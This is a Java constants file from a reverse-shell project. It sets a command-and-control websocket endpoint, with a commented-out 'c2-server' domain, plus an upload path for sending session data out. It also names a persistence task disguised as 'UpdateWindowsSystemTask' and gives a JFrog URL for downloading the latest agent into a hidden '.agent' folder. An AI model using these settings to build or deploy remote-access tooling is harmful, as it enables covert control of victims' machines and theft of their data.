package com.mtattab.reverseshell.util;

public interface Constants {

    public static final String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
    public static final String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;

//    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
//    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;

//    public static final String PROD_SERVER_WEBSOCKET_URI = "wss://<?>/reverseShellClients" ;


    public static final String S3_API_ENDPOINT = "/v1/api/s3";

    public static final String S3_API_UPLOAD = "/upload";


    public static final String S3_API_UPLOAD_SESSION_PARAM = "?sessionId=";


    public static final String PERSISTENCE_WINDOWS_TASK = "UpdateWindowsSystemTask";

    public static final String LOCK_FILE_NAME = "93803181808-lock";

    public static final String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";

    public static final String JFROG_META_DATA_FILE= "maven-metadata.xml";


    public static final String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";

    public static final String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";


    public static final String NEW_AGENT_DIRECTORY= ".agent";


}
